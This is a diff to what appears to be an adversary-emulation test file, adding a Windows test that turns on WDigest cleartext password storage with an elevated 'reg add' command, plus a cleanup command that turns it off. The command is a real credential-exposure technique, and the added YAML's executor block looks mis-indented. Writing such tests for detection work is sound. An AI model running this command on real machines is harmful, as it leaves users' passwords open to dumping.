@@ -87,3 +87,16 @@ atomic_tests:
       ### Garbage collection and closing of ntuser.dat ###
       [gc]::Collect()
       reg unload "HKU\$($ProfileList[$p].SID)"
+
+- name: Modify registry for password downgrade to plain text
+  description: |
+    Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping) 
+  supported_platforms:
+    - windows
+  executor:
+  name: command_prompt
+  elevation_required: true
+  command: |
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+  cleanup_command: |
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
